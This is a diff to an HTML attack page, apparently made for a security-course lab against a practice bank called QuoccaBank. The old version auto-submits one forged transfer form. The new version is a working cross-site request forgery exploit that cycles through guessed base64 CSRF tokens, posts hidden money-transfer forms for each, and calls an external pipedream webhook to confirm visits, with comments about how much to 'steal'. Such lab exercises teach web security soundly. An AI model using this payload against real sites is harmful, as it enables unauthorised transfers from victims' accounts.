@@ -1,17 +1,41 @@
 <!DOCTYPE html>
 <html lang="en">
-<head><meta charset="utf-8"><title>free money</title></head>
-<body onload="document.forms[0].submit()">
-  <!-- Change this if QuoccaBank uses a different sub-domain -->
-  <form action="https://phish-me.quoccacorp.com/api/transfer" method="POST">
-    <input type="hidden" name="csrf_token" value="MTU2Mg==">
-    <!-- YOUR QuoccaBank username here -->
-    <input type="hidden" name="username" value="z5640334">
-    <!-- How much you want to steal -->
-    <input type="hidden" name="amount"   value="100">
-  </form>
-  <p>If you see this text, auto-submit failed – try clicking the big empty space.</p>
+<head>
+  <meta charset="utf-8">
+  <title>totally‐harmless page 🙂</title>
+</head>
+<body>
+<noscript>Enable JavaScript to claim your prize 🏦</noscript>
+
+<script>
+/* === CONFIG === */
+const USERNAME      = "z5640334";  // <-- your QuoccaBank user
+const AMOUNT        = 100;         // <-- how much to steal
+const TOKEN_START   = 1560;        // earliest token we've observed
+const TOKENS_TO_TRY = 50;          // 1560 ➜ 1609  (adjust if needed)
+const ENDPOINT      = "https://phish-me.quoccacorp.com/api/transfer";
+const WEBHOOK       = "https://eok9itjcz7vwbnr.m.pipedream.net";
+
+/* === CSRF spray === */
+for (let i = TOKEN_START; i < TOKEN_START + TOKENS_TO_TRY; i++) {
+  const form = document.createElement("form");
+  form.method = "POST";
+  form.action = ENDPOINT;
+  form.style.display = "none";
+  form.innerHTML =
+    `<input name="csrf_token" value="${btoa(String(i))}">` +
+    `<input name="username"   value="${USERNAME}">`        +
+    `<input name="amount"     value="${AMOUNT}">`;
+  document.body.appendChild(form);
+  form.submit();
+}
+
+/* === Webhook confirmations === */
+fetch(`${WEBHOOK}?visit=${Date.now()}`).catch(()=>{ /* ignore CORS */ });
+setTimeout(() => { location.href = `${WEBHOOK}?done`; }, 800);
+</script>
 </body>
 </html>
+
 
 
